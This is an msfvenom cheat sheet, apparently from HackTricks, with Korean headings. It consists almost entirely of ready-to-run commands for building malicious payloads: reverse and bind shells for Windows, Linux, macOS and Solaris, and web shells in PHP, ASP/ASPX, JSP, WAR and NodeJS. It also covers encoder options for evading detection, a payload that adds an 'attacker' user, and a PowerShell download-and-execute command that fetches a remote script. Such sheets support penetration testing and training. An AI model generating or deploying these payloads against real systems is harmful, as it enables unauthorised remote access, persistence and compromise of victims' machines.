# MSFVenom - CheatSheet

{{#include ../../banners/hacktricks-training.md}}

---

## Basic msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

`-a`를 사용하여 아키텍처를 지정하거나 `--platform`을 사용할 수도 있습니다.

## Listing
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## 쉘코드를 생성할 때의 일반적인 매개변수
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **윈도우**

### **리버스 셸**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### 바인드 셸
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### 사용자 생성
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD 셸
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **명령 실행**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### 인코더
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### 실행 파일에 내장됨
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## 리눅스 페이로드

### 리버스 셸
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### 바인드 셸
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC 페이로드**

### **리버스 셸:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **바인드 셸**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **웹 기반 페이로드**

### **PHP**

#### 리버스 셸
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### 리버스 셸
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### 리버스 셸
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### 리버스 셸
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **스크립트 언어 페이로드**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **파이썬**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **배쉬**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
{{#include ../../banners/hacktricks-training.md}}
